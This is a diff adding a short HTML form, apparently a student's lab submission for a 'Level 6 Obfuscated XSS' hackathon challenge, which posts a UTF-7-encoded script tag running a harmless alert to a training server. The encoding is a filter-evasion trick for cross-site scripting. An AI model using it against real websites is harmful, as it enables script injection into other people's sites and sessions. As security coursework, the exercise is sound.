@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>Level 6 Obfuscated XSS</title></head>
+<body>
+  <h1>Level 6 XSS Test</h1>
+ <form method="POST" action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php">
+  <input name="input" value='+ADw-script+AD4-alert("Ian Cannon")+ADw-/script+AD4-' size="100" />
+  <button type="submit">Submit</button>
+</form>
+
+</html>
